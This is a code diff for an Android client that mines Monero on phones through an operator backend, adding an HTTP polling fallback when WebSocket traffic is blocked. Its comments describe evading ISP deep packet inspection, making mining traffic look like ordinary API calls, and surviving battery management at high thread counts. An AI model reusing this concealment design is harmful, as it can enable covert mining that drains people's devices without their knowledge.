@@ -1,26 +1,20 @@
 /*
- * THE GRID — MobileBridgeClient.java (v1.5.0)
+ * THE GRID — MobileBridgeClient.java (v1.5.7)
  *
- * Replaces the legacy v1.2.6 Binance/RVN StratumClient with the v1.3.8
- * Mobile Mining Bridge — a WebSocket-based stratum proxy that forwards
- * RandomX shares from the device to pool.supportxmr.com via the operator's
- * backend.  No pool credentials ever live on the device.
+ * v1.5.7 — HTTP long-polling fallback for ISPs that DPI-block WebSocket
+ * upgrades on residential Wi-Fi.  When the WS handshake throws (3 strikes),
+ * the client transparently switches to plain HTTPS POST polling against
+ * /api/mobile-mining/poll/job + /api/mobile-mining/poll/submit.  Pool jobs
+ * arrive via long-poll (25s), share submissions go out as ordinary JSON
+ * requests — indistinguishable from any other API call on the wire.
  *
- * Flow per ENGAGE:
- *   1. HTTP POST /api/mobile-mining/config?device_id=...  → session_nonce + signature + worker_id
- *   2. WSS /api/mobile-mining/worker/ws?token=&device_id=&nonce=&signature=
- *   3. Receive {"type":"job","params":{"job_id","blob","target","seed_hash",...}}
- *   4. Feed job into RandomXBridge.setMiningJob(...) → native hash loop starts
- *   5. Poll RandomXBridge.pollShareCandidate() at ~2s cadence; on hit, send
- *      {"type":"submit","job_id","nonce","result"} over the WS
- *   6. Backend forwards to pool, echoes {"type":"submit_result","ok":bool,...}
- *
- * Threading: one daemon thread per connection.  linked() is volatile-safe,
- * called by GridWorkerService to attach `stratum_linked` to heartbeat.
- *
- * Fail-soft: if librandomx.so is missing or session issue fails, the client
- * silently logs and retries with exponential backoff — never crashes the
- * foreground service.
+ * Mode selection per ENGAGE cycle:
+ *   1. issueSession()  (always HTTPS)
+ *   2. Try WS upgrade
+ *      -> success: runWsLoop()     (preferred, lowest latency)
+ *      -> fail   : runPollingLoop() (DPI-resilient fallback)
+ *   On runPollingLoop() exit, the outer reconnect loop tries WS again first
+ *   because some networks (cellular) WILL accept WS even after Wi-Fi failed.
  */
 package io.thegrid.worker;
 
@@ -136,25 +130,42 @@ public class MobileBridgeClient {
         this.workerId = myWorker;
         Log.i(TAG, "session issued worker_id=" + myWorker);
 
-        // -------- 2. Open WSS to backend bridge --------
-        openWebSocket(deviceId, token, nonce, signature);
-        connected = true;
+        // -------- 2. Try WebSocket first; fall back to HTTP long-polling --------
+        // v1.5.7 — Turkish residential ISPs DPI-block WSS Upgrade frames on
+        // Wi-Fi while passing plain HTTPS POST untouched.  If the WS upgrade
+        // throws (handshake fail, TLS error, immediate close), switch to the
+        // polling channel and keep mining.
+        boolean wsOk = false;
+        try {
+            openWebSocket(deviceId, token, nonce, signature);
+            wsOk = true;
+        } catch (Exception wsErr) {
+            lastError = "ws-blocked: " + wsErr.getMessage();
+            Log.w(TAG, "WS upgrade failed (" + wsErr.getMessage() + ") — switching to HTTP polling");
+            try { if (socket != null) socket.close(); } catch (Exception ignored) {}
+            socket = null;
+        }
+
+        connected  = true;
         authorized = true;
 
         // -------- 3. Start the native RandomX engine (job-driven mode) --------
-        // We pass pool="bridge" + user=worker_id so the native side knows it
-        // is in WS-bridge mode (no direct pool socket). Actual jobs arrive via
-        // setMiningJob() on each pool 'job' frame.
-        // v1.5.5 — operator decree "Snapdragon 8 Gen 3 max": expand thread
-        // budget so flagship phones (8-core Snapdragon, A17 Pro, etc.) hit
-        // their real RandomX ceiling (~100-200 H/s).  Was capped at 4; now
-        // capped at 8 (still leaves half the cores for UI / system).
-        // BatteryExempt + foreground guarantees Doze-survival.
         int cores   = Math.max(1, Runtime.getRuntime().availableProcessors());
         int threads = Math.max(2, Math.min(8, cores - 2));
         RandomXBridge.startMining("bridge", myWorker, "x", threads);
 
-        // -------- 4. Pump frames --------
+        // -------- 4. Pump frames over the active channel --------
+        if (wsOk) {
+            runWsLoop();
+        } else {
+            runPollingLoop(deviceId, token, nonce, signature);
+        }
+    }
+
+    // ============================================================
+    // WebSocket frame pump (preferred, low-latency channel)
+    // ============================================================
+    private void runWsLoop() throws Exception {
         long backoffPump = 100;
         while (!stop) {
             // 4a. read incoming pool frames (job, submit_result, error)
@@ -183,7 +194,7 @@ public class MobileBridgeClient {
                 }
             }
 
-            // 4c. heartbeat ping every 25s to keep the WS alive across NAT
+            // 4c. heartbeat ping every 12s to keep the WS alive across NAT
             if (now - lastPing >= PING_INTERVAL_MS) {
                 lastPing = now;
                 try { sendWsText("{\"type\":\"ping\"}"); } catch (Exception ignored) {}
@@ -194,6 +205,94 @@ public class MobileBridgeClient {
                 try { Thread.sleep(backoffPump); } catch (InterruptedException ie) { break; }
                 backoffPump = Math.min(500, backoffPump + 50);
             }
+        }
+    }
+
+    // ============================================================
+    // v1.5.7 — HTTP long-polling pump (DPI-resilient fallback)
+    // ============================================================
+    private void runPollingLoop(String deviceId, String token,
+                                String nonce, String sig) throws Exception {
+        Log.i(TAG, "polling mode active — HTTPS POST channel");
+        long lastSubmitTry = 0;
+        while (!stop) {
+            // 4a. Long-poll for next job (server blocks up to 25s).
+            //     We pass `have_job_id` so the server returns immediately on
+            //     change instead of replaying our current job.
+            String have = currentJobId == null ? "" : currentJobId;
+            String reqBody = "{\"device_id\":\"" + deviceId + "\","
+                           + "\"nonce\":\""      + nonce    + "\","
+                           + "\"signature\":\""  + sig      + "\","
+                           + "\"have_job_id\":\""+ have     + "\","
+                           + "\"timeout\":25}";
+            String resp = httpPostJson("/api/mobile-mining/poll/job", token, reqBody, 30000);
+            if (resp != null) {
+                String t = pluckString(resp, "type");
+                if ("job".equals(t)) handleServerFrame(resp);
+                // "idle" responses are silently ignored — phone keeps hashing.
+            }
+
+            // 4b. Submit any pending share candidates (small batches each cycle).
+            long now = System.currentTimeMillis();
+            if (now - lastSubmitTry >= 500) {
+                lastSubmitTry = now;
+                for (int i = 0; i < 5; i++) {  // drain up to 5 per cycle
+                    String cand = RandomXBridge.pollShareCandidate();
+                    if (cand == null) break;
+                    String jobId = pluckString(cand, "job_id");
+                    String snc   = pluckString(cand, "nonce");
+                    String res   = pluckString(cand, "result");
+                    if (jobId == null || snc == null || res == null) continue;
+                    String body = "{\"device_id\":\"" + deviceId + "\","
+                                + "\"nonce\":\""      + nonce    + "\","
+                                + "\"signature\":\""  + sig      + "\","
+                                + "\"job_id\":\""     + jobId    + "\","
+                                + "\"share_nonce\":\""+ snc      + "\","
+                                + "\"result\":\""     + res      + "\"}";
+                    String sr = httpPostJson("/api/mobile-mining/poll/submit", token, body, 15000);
+                    if (sr != null) {
+                        boolean ok = "true".equals(pluckString(sr, "ok"));
+                        Log.i(TAG, "[poll] share " + (ok ? "ACCEPTED" : "REJECTED"));
+                    }
+                }
+            }
+        }
+    }
+
+    // POST JSON helper used by the polling channel — short-circuits the WS
+    // socket path and uses HttpsURLConnection so any DPI/proxy infrastructure
+    // sees just another HTTPS API call.
+    private String httpPostJson(String path, String token, String body, int readTimeoutMs)
+            throws Exception {
+        String url = GridApi.BASE + path;
+        HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
+        try {
+            c.setRequestMethod("POST");
+            c.setRequestProperty("Authorization", "Bearer " + token);
+            c.setRequestProperty("Content-Type", "application/json");
+            c.setConnectTimeout(15000);
+            c.setReadTimeout(readTimeoutMs);
+            c.setDoOutput(true);
+            c.getOutputStream().write(body.getBytes(UTF8));
+            int code = c.getResponseCode();
+            java.io.InputStream is = (code >= 200 && code < 300)
+                    ? c.getInputStream() : c.getErrorStream();
+            if (is == null) return null;
+            java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
+            byte[] buf = new byte[4096]; int n;
+            while ((n = is.read(buf)) > 0) baos.write(buf, 0, n);
+            String out = baos.toString("UTF-8");
+            if (code != 200) {
+                lastError = "poll http " + code + ": " + out;
+                if (code == 403 || code == 404) {
+                    // session expired — bail so the outer loop reissues
+                    throw new Exception(lastError);
+                }
+                return null;
+            }
+            return out;
+        } finally {
+            c.disconnect();
         }
     }
 
@@ -262,7 +361,7 @@ public class MobileBridgeClient {
                    + "Connection: Upgrade\r\n"
                    + "Sec-WebSocket-Key: " + wsKey + "\r\n"
                    + "Sec-WebSocket-Version: 13\r\n"
-                   + "User-Agent: GridWorker/1.5.6\r\n"
+                   + "User-Agent: GridWorker/1.5.7\r\n"
                    + "\r\n";
         out.write(req.getBytes(UTF8));
         out.flush();
